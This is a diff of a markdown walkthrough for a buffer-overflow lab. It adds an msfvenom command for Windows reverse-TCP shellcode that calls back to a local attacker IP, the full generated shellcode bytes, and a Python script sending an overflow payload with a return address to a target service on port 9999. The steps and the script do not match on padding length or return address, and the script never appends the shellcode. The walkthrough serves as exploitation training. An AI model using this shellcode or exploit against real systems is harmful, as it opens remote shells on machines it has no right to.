@@ -779,11 +779,88 @@ except:
     
     - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`**
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169429642-6103e5bd-18e1-47c2-bebe-0a5f333a471a.png)
+    - ![image](https://user-images.githubusercontent.com/94720207/169602921-162af03e-6b6f-4ef4-be8c-c86e2d71e5e6.png)
 
     - **BOOM!!! We just have generated `THE SHELLCODE` (++++ [in nomine dei nostri excelsi](https://youtu.be/j3_ew_pvPXE?t=292) ++++)
 
+```
+"\xbb\x1f\x19\xb5\xa8\xdb\xce\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x45\x17\x57\x5d\x85\xcf\x15"
+"\x9e\x75\x10\x7a\x16\x90\x21\xba\x4c\xd1\x12\x0a\x06\xb7\x9e"
+"\xe1\x4a\x23\x14\x87\x42\x44\x9d\x22\xb5\x6b\x1e\x1e\x85\xea"
+"\x9c\x5d\xda\xcc\x9d\xad\x2f\x0d\xd9\xd0\xc2\x5f\xb2\x9f\x71"
+"\x4f\xb7\xea\x49\xe4\x8b\xfb\xc9\x19\x5b\xfd\xf8\x8c\xd7\xa4"
+"\xda\x2f\x3b\xdd\x52\x37\x58\xd8\x2d\xcc\xaa\x96\xaf\x04\xe3"
+"\x57\x03\x69\xcb\xa5\x5d\xae\xec\x55\x28\xc6\x0e\xeb\x2b\x1d"
+"\x6c\x37\xb9\x85\xd6\xbc\x19\x61\xe6\x11\xff\xe2\xe4\xde\x8b"
+"\xac\xe8\xe1\x58\xc7\x15\x69\x5f\x07\x9c\x29\x44\x83\xc4\xea"
+"\xe5\x92\xa0\x5d\x19\xc4\x0a\x01\xbf\x8f\xa7\x56\xb2\xd2\xaf"
+"\x9b\xff\xec\x2f\xb4\x88\x9f\x1d\x1b\x23\x37\x2e\xd4\xed\xc0"
+"\x51\xcf\x4a\x5e\xac\xf0\xaa\x77\x6b\xa4\xfa\xef\x5a\xc5\x90"
+"\xef\x63\x10\x36\xbf\xcb\xcb\xf7\x6f\xac\xbb\x9f\x65\x23\xe3"
+"\x80\x86\xe9\x8c\x2b\x7d\x7a\x73\x03\x7c\x38\x1b\x56\x7e\xad"
+"\x87\xdf\x98\xa7\x27\xb6\x33\x50\xd1\x93\xcf\xc1\x1e\x0e\xaa"
+"\xc2\x95\xbd\x4b\x8c\x5d\xcb\x5f\x79\xae\x86\x3d\x2c\xb1\x3c"
+"\x29\xb2\x20\xdb\xa9\xbd\x58\x74\xfe\xea\xaf\x8d\x6a\x07\x89"
+"\x27\x88\xda\x4f\x0f\x08\x01\xac\x8e\x91\xc4\x88\xb4\x81\x10"
+"\x10\xf1\xf5\xcc\x47\xaf\xa3\xaa\x31\x01\x1d\x65\xed\xcb\xc9"
+"\xf0\xdd\xcb\x8f\xfc\x0b\xba\x6f\x4c\xe2\xfb\x90\x61\x62\x0c"
+"\xe9\x9f\x12\xf3\x20\x24\x32\x16\xe0\x51\xdb\x8f\x61\xd8\x86"
+"\x2f\x5c\x1f\xbf\xb3\x54\xe0\x44\xab\x1d\xe5\x01\x6b\xce\x97"
+"\x1a\x1e\xf0\x04\x1a\x0b"
+```
 
+- **We only need to paste it to our last python script and the world is us**  
+
+- **In Kali Machine**
+
+    - Again, We only need to copy that code and modify the last python script or make another new. 
+    
+    - **In my case, I will do another file called `666_INSANE_IN_THE_BRAINSTORM.py` with the last modification.**
+    
+        - We will copy the whole shellcode **inside `()` WITHOUT THE `;` in a new variable called `overflow`**
+        
+        - NOTE: In this case we will not care about the payload size, but maybe there are scenarios with a very limited space (in this case was 4 bytes = "AAAA", so it's something to take care for the future Labs!)
+        
+            - ![image](https://user-images.githubusercontent.com/94720207/169603237-676bbf5a-9c20-4b33-81aa-c0ca16ed9581.png)
+        
+        - We also will add `+ overflow` at the line: `shellcode = "A" * 2003 + "\xAF\x11\x50\x62"` to get:
+        
+            - `shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow` 
+
+
+```python  
+#!/usr/bin/python
+
+import socket
+import sys
+
+        # Remember x86 Architecture:
+
+    # Original = `625014DF`
+    # Spaced   = `62 50 14 DF`
+    # Reversed = `DF 14 50 62`
+    # Final    = "\xDF\x14\x50\x62"
+    
+username = b"fz3r0"
+message = b"A" * 2012 + b"\xdf\x14\x50\x62"
+
+try:        
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))      
+        s.recv(1024)
+        s.recv(1024)
+        s.send(username + b'\r\n')
+        s.recv(1024)
+        s.send(message + b'\r\n')    
+        s.recv(1024)
+        s.close()
+        
+except:
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        sys.exit()
+```
 
 ---
 
